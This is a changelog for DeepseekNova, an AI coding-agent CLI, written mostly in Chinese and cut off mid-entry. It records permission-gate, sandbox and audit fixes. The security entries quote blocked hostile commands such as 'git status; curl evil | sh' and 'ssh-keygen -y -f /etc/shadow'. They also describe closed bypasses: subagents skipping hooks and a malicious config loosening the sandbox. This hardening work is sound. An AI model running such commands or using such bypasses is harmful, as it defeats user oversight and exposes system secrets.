# Changelog

All notable changes to DeepseekNova will be documented in this file.

## [Unreleased]

> 测试数口径：README badge / 技术栈表的测试数为当前权威值（Linux CI 维护）；下方历史条目中出现的测试数（如「1729」）为对应提交时点的快照，非当前值。

### ⚠ Breaking

- **CLI 退出码重排**（消除与 eval 子命令退出码 2/3 的冲突）：
  - `on_max_steps = "pause"` 的非交互结束退出码 `3` → **`10`**（仍打印 resume 提示）；
  - 配置/路由构建错误退出码 `2` → **`6`**；
  - eval 子命令保留 `1`（条目失败）/ `2`（CI 门槛失败）/ `3`（两者）。
  - 依赖旧退出码判定 paused / config 错误的自动化（脚本、CI）需更新为新值。
- **内置工具数 17 → 16**：delegate 委派工具从 `deepseeknova-tools` 移入
  `deepseeknova-agent`（`DelegateTool`，消除 tools→agent 依赖反转），工具数
  以当前实现为准。
- **全 workspace 错误模型统一**：移除 `anyhow`，公开 API（`Tool::execute`、
  `Runner::run_stream`、`ChunkStream`/`RunEventStream` 等）统一改用
  `deepseeknova_core::DeepseeknovaError`；`Provider` 变体改为结构化
  `{ message, retryable }`，`is_retryable()` 不再依赖消息文本匹配，IO 仅
  瞬时错误种类（TimedOut/ConnectionRefused 等）可重试。

### Fixed（2026-08-10 全面体检轮）

- **`config` 命令凭据脱敏**：内联 `api_key` 与常见认证头（authorization /
  proxy-authorization / x-api-key / cookie / set-cookie）展示时替换为
  `[REDACTED]`，避免密钥明文进终端。
- **子代理路径挂载用户 hooks**：`SubAgentRunner` 与 `DelegateEngine` 内的
  子代理工具调用现在与主 agent 对称触发 `tool_before`/`tool_after` 等用户级
  hooks（此前子代理可绕过 hooks，已补两条端到端回归测试）。
- **会话 id 唯一性**：`store::new_session_id` 由秒级改为
  `chat-YYYYMMDD-HHMMSS-mmm-ssss`（毫秒 + 进程内序号），同一秒连续新建
  会话不再写入同一 JSONL；`/resume` 增加 `is_valid_session_id` 白名单校验，
  封堵 `../`/绝对路径越界读写。
- **TUI 会话预览只读首行**：`preview_first_prompt` / `session_workspace`
  改为 `BufReader` 只读首行，不再把整个会话文件读进内存。
- **风险标签端到端测试补齐**：Ask 决策 → ApprovalRequest → responder 收到
  `[风险:…]` 前缀的整链断言（BLOCKED 点名缺的测试项）。
- **主对话 @-mention 接线**：`[delegate] enabled=true` 时 CLI REPL 与 TUI
  支持 `@agent_name` 直接唤起子代理（`MentionAwareRunner` 选择主/子路径，
  歧义引用显式报错），补 3 条派发/回退/消歧测试。
- **DelegateEngine 递归贯通**：`allow_recursion=true` 时引擎子代理挂
  `RecursiveDelegateTool`（sink = 引擎自身），每层真实深度注入工具上下文，
  深度上限在 `run_at_depth` 守门、超深优雅降级；补引擎递归与运行时装配测试。
- **API key 环境变量命名裁决**：默认变量名统一为 `DEEPSEEKNOVA_API_KEY`，
  旧名 `DEEPSEEK_API_KEY` 仅作兼容回退（新名优先），provider/README/README_EN
  同步，补主/旧名回退测试。
- **npm 安装包落地**：新增 `npm/deepseeknova` 包——postinstall 从 GitHub
  Releases 下载当前平台二进制、校验 SHA-256、解压到 `vendor/`，`bin` 转发；
  release.yml 增 `npm-publish` 任务（配 NPM_TOKEN 后随 tag 自动发布）。
- **Windows Job Object 沙箱后端**：`windows::JobSandbox` 实现（挂起创建 →
  挂入 Job → 恢复主线程，kill-on-close + 活动进程/内存限制，句柄由独立线程
  在进程退出后释放）；`platform_sandbox*` Windows 分支切换为新后端，CLI
  平台缺失警告改为按实际 `is_active()` 判定。
- **README 真实截图**：`docs/screenshots/tui-welcome.png` /
  `tui-chat.png` 由 `scripts/tui-screenshot.py` 真实运行 TUI 生成
  （mock provider + PTY + pyte/Pillow），README/README_EN 已嵌入。
- **telemetry 静默失败语义**：`TelemetryGuard::init` 在全局 subscriber 已
  存在时只 warn 仍返回 Ok，新增 `installed()` 让调用方能识别导出层是否生效。
- **文档/账本同步**：README 测试数更新为 1729、CHANGELOG i18n 键数更新为
  257、PRODUCT 信息层级演进标记已落地、BLOCKED 对账（description/
  PermissionGate 审计/temperature 接线/M3）、清理桌面端过期注释。

### Fixed（审计批次 2026-08-08，AUDIT-2026-08-08.md）

- **权限门拒绝持久化审计（M1）**：`PermissionGate` 新增 `with_audit_logger`
  注入（缺省 None 向后兼容）；`permission_gate_for` 生产路径注入
  `JsonlAuditLogger::at_workspace`，越界路径/危险命令/deny 规则/限流四类
  拒绝均落盘 `.deepseeknova/security/audit.jsonl`（含工具名/能力/路径/被拒
  命令原文）。fail-open：无审计器或写盘失败不阻断判定。
- **readonly 多词白名单尾部 flag 逃逸（L5）**：`uname -a`/`fc -l`/`ssh-keygen
  -y`/`sysctl -a`/`pkgutil --pkg-info` 等改精确 argv 匹配；`unzip -l`/`7z l`
  改专项白名单（拒绝解包字符 `-d/-o/-j/-n/-p/-P/-w`）；仅"写形态为独立
  子命令"的条目（`systemctl status`/`defaults read` 等）保留前缀匹配。封死
  `ssh-keygen -y -f /etc/shadow` 类尾部 flag 转写/泄密面。
- **库路径构造不 panic（L2）**：docs_tools/web_fetch/web_search 的
  `.build().expect()` 改返回 `DeepseeknovaError`（构造失败传播错误不 panic）。
- **async 主循环 embed 不再阻塞 worker（H4）**：runtime 起点/中途召回与
  DistillHook 三处同步闭包包 `block_in_place`（多线程 runtime 释放 worker，
  current_thread 环境直调保兼容）；补"阻塞窗口内心跳推进"双向测试。
- **`.deepseeknova/agents/*.md` 子代理声明接线（M3）**：`[delegate]
  agents_dir` 配置（缺省 `.deepseeknova/agents`）经 `AgentManifest::load_dir`
  解析注册到 build_delegate_engine / build_sub_agent_runner，与 TOML 预设
  合并（同名 markdown 覆盖）；缺目录 warn 跳过。
- **delegate 引擎 max_depth 守门（M5）**：`build_delegate_engine` 透传
  `config.delegate.max_depth` 到 `DelegateEngine::with_max_depth`，配置上限
  在生产路径生效；修 `DelegateConfig::merge` 漏合并
  `allow_recursion`/`max_depth`/`agents_dir`。
- **agent 死代码清理（M2）**：Memory repeat-guard（record_call/
  reset_repeat_guard/idle_duration）、Coordinator goal_mode（GoalContract/
  with_goal_mode/PLANNER_SYSTEM_PROMPT_GOAL）、PhaseRunner current_phase
  全部删除（grep 零消费者实证）。
- **extract_json 统一（M9）**：memory_distill/reflection/coordinator 3 处
  重复实现统一为 `crate::review::extract_json`（等价性测试锁定）。
- **Mutex 锁毒恢复（L3）**：sub_agent 的 `.lock().unwrap()` 改 poison 恢复
  （warn + into_inner），真毒化测试。
- **DelegateTool 能力门禁（L4）**：execute 入口 `enforce_capability` 要求
  `CommandExecute`（库级裸装配不再绕过受限能力上下文）。
- **Runtime/EventBus/ContextEngine 标注库级 API（M4）**：event crate doc
  标注未接入生产路径；BLOCKED 条目关闭。
- **文档/CI 同步（G4）**：README/GUIDE 补 hooks/权限预设/信任/audit/预算/
  network_allow_domains//rename /checkpoint/mode/语义检索/记忆用户面/worktree/
  i18n；工具数 16；CHANGELOG 退出码；ci.yml release job 删除（release.yml
  专管）；release.sh/bump-version.sh 重写；dotenvy 死依赖删除；20 crate
  docs URL 去版本号；SECURITY 版本表 0.5.x；PROMPT_DESIGN 删除项标注。

### Refactor / Test（2026-08-08 第二轮，793fed2 / 4c6929d）

- **M7 大文件拆分**：`deepseeknova-agent` 的 agent.rs（7188→6571 行）抽
  approval/render/agent_diag/classify/path/tools 六子模块；`deepseeknova-runtime`
  lib.rs（5089→2458 行）抽 helpers/security/metrics/hooks/diagnose/protocol/
  delegate/test_support 八子模块。纯机械搬移，对外 API 经 `pub use` 保持。
- **M7 拆分续**：`agent.rs` → `agent/mod.rs` + 新增 `agent/loop_impl.rs`，
  主循环 `run_agent_loop` / `run_review_pass` / `stream_and_process_turn` /
  回合级工具执行与审查/反思/归因助手（含 `MidRunRetrieval` 结构体）整段迁出。
  均为自由函数（状态经参数传入），`agent/mod.rs` 生产代码 3296→1284 行，
  新模块 2026 行；对外经 `pub(crate) use` 保留原名，333 测试全绿零告警。
- **M8 测试密度**：graph 78 条（15.97/1kLOC）、runtime 93 条（15.32/1kLOC），
  新增非 ignore 集成 e2e；顺带修复 graph Go 相对导入 file 边 bug。

### Fixed（TUI 冷启动与交互批次）

- **冷启动崩溃修复**：fresh 环境（无任何配置）裸命令 / `chat --tui` 曾因
  `resolve_provider_cfg` 对空 providers 取 `[0]` 直接 panic（exit 101）；现改为
  打印「运行 `deepseeknova-cli setup` 或添加 `[[providers]]`」引导并以退出码 6
  退出。有配置但 API key 缺失时同样给出 `export DEEPSEEK_API_KEY=...` 引导。
- **TUI 配置状态警示**：`TuiRunner::with_config_status` 注入 provider/key 状态；
  欢迎块、状态栏、`/model` 在未配置时给出红色 setup 引导（库级嵌入兜底）。
  状态栏模型名不再显示无意义的 `default`（回落 provider 自带 model）。
- **键位真相修复**：空闲 `Ctrl+C` 与 `Esc` 同语义（二次确认退出）而非静默无
  响应；空输入 `Ctrl+D` 退出（shell 惯例）；`Ctrl+Z` 提示 raw 模式不可挂起；
  `keybindings.json` 保留键清单与事实对齐（`Ctrl+\` 改为可重绑的默认绑定，
  `Ctrl+X` 补入保留；Reserved 文案改为 app 占用而非「OS 保留」）。
- **Input 编辑键接入 keymap（P1-1）**：`handle_editor_key` 改 keymap 感知分派
  （用户覆盖/解绑优先 → 编译期绑定表 → 保留键/自由插入硬编码），Enter/Ctrl+A/E/
  U/W/Tab/方向键/Home/End 等编辑键现在可经 `keybindings.json` 重绑或解绑；
  Home/End 拆分行内（Home/End 键）与缓冲区（Ctrl+A/E）语义（`chat:homeLine`/
  `chat:endLine`）。
- **F1 / Ctrl+L / 键位表补齐**：`F1` 打开 `/help`，`Ctrl+L` 清屏重绘；BINDINGS
  补齐 Input 实际存在的编辑键（`Ctrl+A/E`、`Ctrl+Enter`）；`/help` 补 Tab /
  `Ctrl+\` / `Ctrl+P` / Esc Esc / 侧边栏 `1..5` / `Ctrl+T` / F1 等键位说明。
- **bracketed paste**：启用 bracketed paste，多行粘贴以整段文本插入输入框，
  不再把内嵌换行当作 Enter 提交（曾贴一半就发出）。
- **状态栏信息补齐**：工作区 cwd / git 分支（`⎇ branch`）+ thinking effort 后缀
  （`model·high`），窄终端按优先级丢弃。
- **对话区**：非贴底滚动时右上角显示 `▍N%` 滚动位置；回合结束追加边界行
  （`─ 第 N 轮完成（Xs）─`）；迟到/启动期错误不再静默丢弃（回显到反馈区）。
- **`/workspace` 命令**：显示当前工作区（路径 + git 分支）、已保存会话数、
  可用 git worktree 列表，并给出切换工作区（`cd <path> && deepseeknova-cli
  chat --tui`）与按项目隔离会话（`deepseeknova-cli worktree new`）的引导。
- **会话 workspace 元数据**：`StoredTurn` 新增 `workspace` 字段（serde default
  向后兼容旧会话文件），CLI/REPL/TUI 落盘时记录工作区根；侧边栏会话面板按
  工作区分组（`⎇ 项目 · 会话数`，未知归「全局」组，组内按夜次分组），
  `/workspace` 输出每工作区会话数明细，`/sessions` 对非当前工作区的会话标注
  `[项目名]`。
- **侧边栏 MCP/Skills 接线真数据**：MCP 面板进入即异步探测（进程 spawn + 短
  超时，不阻塞事件循环；之后每 30s 冷却刷新），实时显示各 server ✓ 已连接 /
  ✗ 未连接（原因）；Skills 面板启动一次性扫描技能目录并列出 name — description。
  两处不再是「运行 /mcp /skills」的空占位。

### Added（提示词基线与执行账本契约，2026-08-10）

- **子代理执行契约基线（`compose_sub_agent_prompt`）**：新增
  `deepseeknova_agent::prompts::compose_sub_agent_prompt`，把
  `DEFAULT_SYSTEM_PROMPT`（"# DeepseekNova Agent — Execution Contract"）作为
  基线追加在子代理角色提示词之前，确保子代理也遵守执行契约（Read before
  writing / 权限 / 证据优先 / 不破坏无关改动等）。`build_delegate_engine` 与
  `SubAgentRunner` 路径已切换至 composed prompt；空角色提示词退化为纯基线。
  回归测试断言基线出现在角色提示词之前。
- **执行账本契约（库级 API，未接入生产路径）**：`deepseeknova-core` 新增
  `execution` 模块（`ExecutionLedger` trait / `ExecutionEventEnvelope` /
  `RunProjection` 状态机 / `ExecutionMode` 三档 Off/RecordOnly/Authoritative），
  `deepseeknova-store` 新增 `SqliteExecutionLedger`（事务化 append +
  projection 持久化 + sequence 守门）。当前为库级 API，agent/runtime/serve
  尚未消费；为后续持久化恢复驱动预留，与 event crate 标注库级 API 同先例。

### Changed（依赖迁移，2026-08-10）

- **serde_yml → serde_norway**：迁移 YAML 序列化依赖从 `serde_yml 0.0.13`
  （unsound + unmaintained，RUSTSEC-2025-0068）到 `serde_norway 0.9.42`
  （serde_yaml 的 maintained fork）。API 1:1 兼容，13 处代码命中（core +
  skills）机械替换。`deny.toml` 移除 `RUSTSEC-2025-0068` ignore，CI
  `security.yml` 同步移除 `--ignore`。Cargo.lock 确认 serde_yml 已移除。

## [0.5.0] — 2026-08-08

### ⚠ Breaking

- `agent.on_max_steps` 默认值为 `"pause"`：max_steps 耗尽不再返回错误，而是发出
  `Paused` 事件并优雅结束（CLI 非交互以退出码 3 结束并打印 resume 提示）。
  依赖旧行为的自动化请显式配置 `[agent] on_max_steps = "error"`。
- `edit_file` 语义收紧：SEARCH 须在文件中**唯一**命中（旧版替换首个匹配）；0 或多处命中
  时整次调用失败、不产生半改。多处编辑请用新的 `edits: [{search, replace}, ...]` 数组。

### Added

- **日常体验包（个人开发者向）**：
  - `web_search` 工具：DuckDuckGo（免 key）/ Tavily / Bing / SearXNG 四后端，
    `[tools.web_search]` 配置 provider/base_url/api_key_env/max_results/timeout；
    受 SecurityContext 域名策略与 NetworkAccess 能力约束。
  - `lsp_diagnostics` 工具 + 编辑后自动诊断：write/edit/move 成功后自动调用
    rust-analyzer / pyright-langserver / gopls / typescript-language-server /
    clangd，诊断注入 ToolResult；`[tools.lsp]` 可关/调超时/按语言覆盖服务器；
    服务器缺失或文件超限时静默跳过。
  - Auto 模型+思考路由：`[agent] auto_route = true` 时每轮先由廉价模型决定
    flash/pro 与 thinking off/high/max，工具续步复用决策，失败回退启发式/默认
    模型；显式 `--model` / `/model switch` / 显式 effort 始终绕过 auto。
  - serve 持久化任务恢复：run 落盘 `.deepseeknova/runs/`，新增
    `GET /v1/runs` 与 `POST /v1/runs/{id}/resume`；重启后 running 任务自动
    标记 interrupted 可重新拉起。
  - ACP（Agent Client Protocol v1）stdio 适配器：`deepseeknova-cli serve
    --acp` 以 JSON-RPC 2.0 行协议暴露 `initialize` / `session/new` /
    `session/prompt` / `session/cancel` / `session/close`；会话按 `cwd`
    重建 agent 并共享多轮历史，`Ask` 权限 fail-closed 拒绝。
  - `eval` 子命令：从 JSONL（支持 `#` 注释）逐条跑真实 prompt 并断言
    `must_contain` 子串，输出 md/json 报告，适合做最小回归评估集。
  - Windows 运行时沙箱警告：无 OS 级沙箱时启动即打印显式警告（不只在 README）。
  - 桌面端纯前端脚手架（`crates/deepseeknova-desktop/frontend`）：Vite 6 +
    SolidJS + TypeScript + Tailwind CSS 4，首屏按「新星观测台 A×B 合并构图」
    实现双顶带 / 夜次分组观测日志栏 / 划线对话流 / 时间轴星座图 / 六维测光
    评分卡；含 14 条 vitest 纯函数测试。~~（已于 v0.5.0 发布前整体移除，
    desktop crate 从仓库删除，见 c10fec3）~~
  - TUI 观测台演进：浅色档对齐「印刷星图」token（`#3B55D9` 深化品牌蓝、
    `#D8DDEC` 墨线、`#DDE4FB` 选中底）；侧边栏会话按夜次分组并显示
    `◉/●/·` 星等三档；审批浮层展示风险标签（只读/非只读/危险）与完整
    mono 命令；新增 `/scorecard` 命令与侧边栏测光六维表；欢迎卡缀圆顶字形
    `⌒`；权限层新增 `PermissionGate::shell_readonly_kind` 供审批风险标签取数。

### Fixed

- **Windows 路径逃逸防护回归（安全）**：`PermissionGate` 对写工具收到的**畸形
  JSON**（Windows 路径未转义反斜杠使 `\a`/`\.` 成为非法转义）曾静默降级并跳过
  工作区路径守卫 → 现 fail-closed 硬拒；`is_within_workspace` 改为**词法判定
  优先**（跨平台一致，`..` 弹出根外即拒），canonicalize 仅作 symlink 补充。
  修复 CI `cargo test (windows-latest)` 上两个路径逃逸回归测试的持续失败。
- **安全项（审查确认 F1–F6）**：
  - `rg`/`yq` 从"任意参数安全"表降级为专项白名单：`rg --pre`（命令执行器）、
    `yq -i`/`--inplace`（就地写文件）不再免询问放行。
  - `SecurityPolicy::is_command_allowed` 前缀匹配不再被 shell 组合绕过：
    按 argv 词边界匹配 + 拒绝未引用 `|;&<>`/`$()`/反引号（`echo hi > /etc/passwd`、
    `git status; curl evil | sh` 均拒绝）。
  - `write_file`/`edit_file` 的 `.tmp` 原子写改用 `O_EXCL`（`create_new`）：
    预埋 symlink 指向工作区外时写入失败而非跟随链接写外部文件。
  - 主 agent 路径无审批 responder 时 `Ask` 自动允许改为**记录安全审计事件**
    （`security_event = "ask_auto_allowed_no_responder"`），fail-closed 调用方可
    配置 `mode=deny`。
  - Seatbelt 配置可写路径插值转义 SBPL 特殊字符，恶意项目 `deepseeknova.toml`
    无法再注入规则放宽自身沙箱。
- **fetch_full_result 工具接线（token 节省闭环）**：`FetchFullResultTool` 原为
  孤儿模块（从未注册），但截断提示会引导模型调用不存在的工具；现以共享
  `Arc<tokio::sync::RwLock<Memory>>` 注册进运行工具集，大工具结果截断后模型可
  凭 call_id 按需取回完整版。
- LSP 空诊断不再等满 `timeout_secs`：收到空 `publishDiagnostics` 后 1.5s 内
  无迟到的非空更新即返回“No LSP diagnostics”。
- Auto 路由改为每 run 决策一次（由 Agent 循环持有），serve 并发请求不再共享
  决策缓存、不会串台。
- serve durable runs：SSE 客户端断开后任务继续跑完并正确落盘，不再取消任务
  或把半截结果标成 Done；`resume` 通过原子 claim 防并发重复执行。
- `web_search` 关闭自动重定向并逐跳复验域名/SSRF（与 web_fetch 一致）；
  未知 provider 直接报错，不再静默回落 DuckDuckGo。
- `lsp_diagnostics` 补 `FileRead` 能力门控，与 fs/grep/ls 一致。

- **记忆语义检索（embedder remote）**：`[memory] embedder = "remote"` 启用
  OpenAI 兼容嵌入（`/v1/embeddings`；key 从 `DEEPSEEKNOVA_EMBED_API_KEY` 读取，
  回落 `OPENAI_API_KEY`，不落配置/日志）。写入记忆自动生成向量；召回融合
  `0.5*bm25 + 0.5*余弦 - rank_lifecycle_weight*生命周期惩罚`（FTS 基数改纯
  bm25，消除双重计权），可找回无共词的同义记忆；缺 key/网络错/解析错一律
  fail-open 回落纯 FTS。`[memory]` 新增 `embed_base_url`（默认
  https://api.openai.com/v1）/`embed_timeout_secs`（默认 30，含分层 merge）；
  CLI 新增 `memory embed-backfill`（跳过 archived），`memory stats` 输出
  `embedded=N/total=M`。零新增外部依赖（复用 provider 已有 reqwest/tokio）。

- **Protocol 增强收尾（task_rate + record_use 回填）**：评分卡扩展 `first_pass` /
  `retry_rounds` 字段（serde default，旧文件兼容）——成功会话按首过填写，失败/
  Paused 会话由诊断回调按 `DiagnoseReport.failures` 推导覆写；fitness 记录
  `record_use` 接线（recall 注入侧收集实际注入的技能名 → 会话结束记 `use` +
  `result`，空集合优雅跳过、不再 warn）。

- **Graph Go 语言支持**：代码图引擎新增 Go（tree-sitter-go 0.25，新依赖仅此一个）——
  解析包级函数 / 方法（receiver）/ `type_declaration`（struct→Struct、
  interface→Trait）实体、名称级调用（含 `pkg.Func`/`recv.Method` 取末段）、
  import 三态（stdlib/第三方裸路径记外部依赖、相对路径记本地文件）；`go.mod`
  require 段（块式与单行）解析进外部依赖表，`deps_code` 支持 Go 项目。

- **记忆生命周期闭环**：memory schema 版本机制（`meta.schema_version` 初值 "1"，
  版本不符走迁移表——当前为空——不炸）；检索排除 archived（不参与召回），排序融合
  生命周期因子（bm25 + importance/stage/recency，`[memory] rank_lifecycle_weight`
  默认 0.3，0 = 纯 bm25 等价旧行为）；衰减接线（`MemoryEngine::decay`/`cleanup`，
  非 permanent 衰减、<0.1 归档、permanent 豁免、超期 archived 删除）；`[memory]`
  新增 `decay_rate`/`archive_ttl_days`/`rank_lifecycle_weight`（含分层 merge）；CLI
  新增 `memory cleanup`，`memory stats` 输出 stage 分布与 archived 计数；蒸馏双轨
  统一入口 `record_knowledge`（reflect lesson / llm-distill 同内容跨入口去重）。

- **任务质量闭环**：permission gate 升级为可编程 `ToolHook` 链（core 定义
  trait + `HookVerdict`/`QualityFinding`，agent 主循环 before/after 挂载，
  panic 契约：before/interested fail-closed Deny、after fail-open）；
  写后确定性策略评估 `[quality]`（默认开，`security::quality::QualityPolicy`
  内置 no-commit-secret / no-forbidden-path / oversized-write 三条 0-token
  规则，Blocking 级 finding 才触发 LLM review 短路降本）；bash 写路径启发式
  提取（重定向/tee/cp/mv/install，防禁写规则被 shell 绕过）；结构化失败诊断
  `DiagnoseReport`（阶段分解/时序/失败详情/子代理链/findings，失败与 Paused
  才产出、取消 suppress、0600 + 密钥脱敏落盘 `.deepseeknova/metrics/diagnose/`）；
  四维评分卡 `Scorecard`（守规/验证/反思/审查，`<id>.scorecard.json` 独立
  落盘 + 跨会话聚合，retention 排除误裁）；serve 新增 `GET
  /v1/sessions/{id}/diagnose`、`/v1/sessions/{id}/scorecard`、
  `/v1/metrics/scorecards`（session id 白名单防路径穿越，无认证仅限本地）；
  CLI 装配 session label（`session-<ts>`）与诊断/评分落盘；TUI 渲染
  `quality_finding` 事件；MetricsHook 扩展为
  `Fn(SessionSnapshot, QualitySummary)`（findings run 级差分、上限 10000）。

- **TUI v2 全面重设计**：`deepseeknova-tui` 从单文件拆分为
  `app/commands/input/model/render/theme` 模块，会话内容改为实时增量构建的消息树
  （Turn → Segment，推理不再被工具调用从中间拆断）；新增消息导航焦点
  （`j`/`k` 选中、`Enter` 折叠、`y` 复制）、5 标签侧边栏（`Ctrl+\`）、命令面板
  （`Ctrl+K`，与斜杠命令共用注册表）、`@` 文件补全、markdown 输入着色、
  `/fold` 与 `/copy` 命令、`DEEPSEEKNOVA_THEME` 主题（codex/dark/light）、
  状态栏上下文占用率（`ctx N%`）。`TuiRunner` 公共 builder API 保持兼容，
  新增 `with_theme` / `with_at_files` / `with_context_window`。
- **顺手活清仓（除前端）**：TUI 状态栏常驻成本显示（router ledger 每帧刷新）；
  TUI diff 输出行级高亮（`+` 绿 / `-` 红 / `@@` 青）；`/mcp` 实时连接状态探测
  （短超时 spawn 检查 stdio server 存活）；多行输入框（Shift+Enter / Ctrl+J
  换行、行内 Home/End、纵向跟随）；`[verify] llm = true` LLM 验证（默认关，
  明确判定失败才回炉，调用/解析失败优雅跳过）；README 测试徽章与 Tauri 命令数
  同步实测值。
- **代码库智能：符号引用与依赖图**：`References` 边真实生成（定义体标识符按
  名称级解析到索引符号，跳过 callee/自身，已有 Calls 边不重复）；结构化
  import/use/require 依赖图（本地符号 文件→符号、JS 相对路径 文件→文件），
  Cargo.toml/package.json/pyproject.toml 清单依赖解析进外部依赖表；新增只读
  工具 `deps_code`（文件依赖/依赖方 + 全库外部依赖汇总），检索提示词同步。
- **长期记忆 LLM 知识蒸馏**：`[memory] llm_distill`（默认 false，成本敏感）——
  回合结束在启发式沉淀之外，用可选模型把任务观察提炼成可复用 skill/教训
  （JSON 契约 `{"kind":"skill"|"lesson",...}`，Skill 类目落库、内容去重 + 脱敏、
  失败静默跳过）；`llm_distill_model` / `llm_distill_max_chars` 可配。
- **反思→修复闭环**：P1 验证 / B3 审查失败回炉前插入显式 LLM 反思（JSON 契约
  root_cause/fix_plan/lesson），回炉消息前置反思，lesson 经 LessonHook 沉淀进记忆
  （Skill 类目、去重 + 脱敏）；`[agent] reflect_on_failure` 默认 true，
  `reflect_model` / `reflect_max_chars` 可配；反思失败静默回落原文案。
- **代码图多跳推理（CodeGraph 式增强）**：新增 `Dispatch` 边把 Rust trait 方法桥接到
  全部同名 impl 方法（`dyn Trait` / 泛型调用点可列出候选实现，名称级匹配）；新增三个
  只读工具 `trace_code`（多跳调用链，深度上限 6 并标注截断）、`impact_code`（按文件
  聚合的影响面/重构爆炸半径）、`explore_code`（按文件分组的行号源码）；运行时在
  `[graph] enabled` 时注册并更新检索策略提示词。
- **Context7 库文档检索**：新增只读工具 `context7_docs`（库名 + 主题 → 最新第三方库
  文档片段），无需 API key；端点固定 context7.com，执行受 NetworkAccess 能力把关，
  错误全部转友好提示；由 runtime 常驻注册，可用 `[tools] overrides` 禁用。
- **系统提示词体系**：主 agent 新增英文默认系统提示词（决策引擎 + Observe→Plan→
  Tool→Verify→Reflect→Next Action 六阶段循环），未配置 `system_prompt` 时自动启用、
  配置覆盖优先；plan_mode/planner/delegate×4/review/compaction/scanner/图检索提示词
  统一为同一循环术语，机器输出契约不变；新增 `BACKEND_AUDIT.md`（后端 22 crate 全量
  审计）与 `PROMPT_DESIGN.md`（全链路提示词设计文档）。
- **TUI 视觉重做（参考 Codex CLI）**：语义配色（用户/状态=cyan、agent=magenta、
  次要信息=dim、成功=green、失败/错误=red），状态行按段着色，底部新增快捷键
  提示行，对话区标题去掉 emoji，深浅色终端自适应。
- **TUI 终端界面重做**：完整渲染推理（斜体暗色）/ 工具调用与结果（截断预览）/
  确定性验证（✓/✗）/ 暂停 / 审批请求 / 错误；滚动回看（PageUp/Down、Home/End、
  自动跟随、2000 行上限）；输入历史（↑/↓）；命令 `/help` `/clear` `/quit`；
  Ctrl+C 取消当前运行；状态栏显示模型、阶段、turn、token 用量与滚动位置。
- **TUI /model 热切换与 /cost**：接入 agent 重建工厂与 ModelRouter，支持
  `/model effort <level>`、`/model thinking`、`/model switch <name>`、
  `/model use <role> <name>`（角色指针热切）、`/cost`（按模型×角色输出
  token 用量与美元估算）。
- **TUI 会话管理**：新增 `SessionController` trait（CLI 用 ChatPersistence
  实现），支持 `/new`（清空历史并更换 session id）、`/sessions`（列出并标记
  当前会话）、`/resume <id>`（恢复历史到共享缓冲）；每个完成回合自动落盘
  （用户 prompt + 助手输出），与 REPL 同一 JSONL 会话存储。
- **TUI 完善**：命令面补齐 `/skills`（技能目录可配）、`/mcp`（列出已启用
  server）、`/raw`（normal/lite/raw 显示模式）、`/undo`（新增 UndoController
  trait，CLI 经 CheckpointManager 实现 `/undo` `/undo all` `/undo list`）；
  输入升级为带可见光标的单行编辑（←/→/Home/End/Delete/Ctrl+U/Ctrl+W，
  UTF-8 安全、超宽横向跟随）；运行事件按代际隔离，旧回合残留流不串台、
  不触发落盘；`/resume` 恢复后把历史渲染进对话面板；GUIDE/TUI README 同步。

- **检查点上线（A1）**：`[checkpoint]` 配置（默认开）把 CheckpointManager 装配进
  write/edit/move 工具（写前快照），快照持久化为 JSONL（跨进程可回滚）；新增 CLI
  `checkpoint list / rollback [--all] / clear`。
- **项目后置产出 CLI（A2）**：`artifacts wiki` 与 `artifacts cards` 生成 Wiki/知识卡片。
- **repo map 个性化（A3）**：按当前用户输入提取标识符 seeds（去停用词、去重、上限 8）
  做 personalized PageRank，地图优先展示任务相关模块。
- 文档同步（D）：DESIGN.md 状态纠正（skills/artifacts 已落地、P5/P6 待实现）、GUIDE
  补充新命令、GitHub 仓库描述移除过时的 GOAP/Swarm 表述。

- **并行工具执行**：同批读类工具经 `JoinSet` 并发执行、写类工具保序串行；
  `agent.concurrent_tools` 从配置占位变为生效开关（默认 true）。权限预检先行，
  结果按原始调用顺序回写事件与历史。
- **`[verify]` 完成前确定性验证**（默认关）：写入轮完成后按 `commands` 经 bash 工具
  验证（沙箱/白名单/资源限制全部生效），失败以 User 消息回炉修复，超过 `max_cycles`
  后 `Paused(verify_failed)` 交人工；新增 `verification` WireEvent（桌面端/SSE 可见）。
- **P2 高频决策经济学**：`step_effort_routing` 每步按规则在 quick（thinking off）/
  high 间切换 provider；`observe_compress` 用廉价模型把超阈值工具输出摘要后入历史
  （事件流保留原始结果）；`tool_cache` 会话内只读工具结果缓存（写执行后失效）。
- **P3 上下文与检索**：真实 token 计量（tiktoken，失败回退字符/4 启发式）；L3 压缩后
  按最近用户意图自动召回记忆注入；记忆检索中文二元组增强（FTS5 中文命中）；任务-文件
  关联沉淀（`record_task` 为触碰文件写入 `file:<path>` 记忆）。
- **P4 产品化**：Coordinator 模式接入代码图索引与图检索工具，只读工具对规划器开放
  （安全边界：规划器仅可调用只读工具）；CLI setup 模板补充 P2/verify/角色分工示例。

- `[review]` 完成前自审（默认关）：文件写入后由廉价模型审查 diff，issues 回炉一轮修复，
  仍有问题以 `Paused(review_issues)` 交人工；非 git/解析失败一律降级放行。
- 新增 `deepseeknova-scanner` crate 与 `deepseeknova scan` 子命令：内置正则规则
  （硬编码密钥、SQL 拼接、命令注入、rust-unwrap 等）扫描工作区，可选一次性 agent
  AI 调查并输出 md/json 报表；支持 `--path`、`--format md|json`、`--no-ai`、
  `--severity-min high|medium|low`。
- `read_file` 支持 `start_line`/`end_line` 区间读，只把需要的行送入上下文（省 token）。
- `edit_file` 支持 `edits` 多块数组，一次调用原子地替换多处（全有或全无）。
- **协议增强能力包（2026-08-05）**（`[protocol]`，默认关闭）：core 新增 `protocol.rs`
  （Phase 五阶段 / GateViolation / PhaseTransition / DriftFinding / PhaseGate /
  NoopPhaseGate），RunEvent/WireEvent 新增 3 变体；agent 新增 `phase_runner.rs`
  PhaseRunner + 内置四门（plan-before-execute / verify-evidence /
  distill-on-complex / drift-detection，前三 soft、verify-evidence hard，
  `hard|soft|off` 三力度，off 完全关闭 drift 计数）。验证强化：verify-evidence
  硬门（verify 配置且零 passed → Blocking，走工具层 gate_block 拒绝路径保住
  replay 不变量）；无证据 Complete → DiagnoseReport `outcome="unverified"`；
  对抗审查子代理（Blocking finding / 敏感工具调用+marker 叠加两触发条件，
  `[protocol] adversarial_review` 独立开关，max_steps=3、无工具注册、输入输出
  预算 cap，无 Skill 优雅跳过）。技能自进化：skills 新增 `fitness.rs`
  （SkillFitnessRecord / FitnessStore 容量 500 LRU / EvolutionSuggestion
  Deprecate/MergeCandidate/Promote，deprecated 标记过滤不删文件），落盘
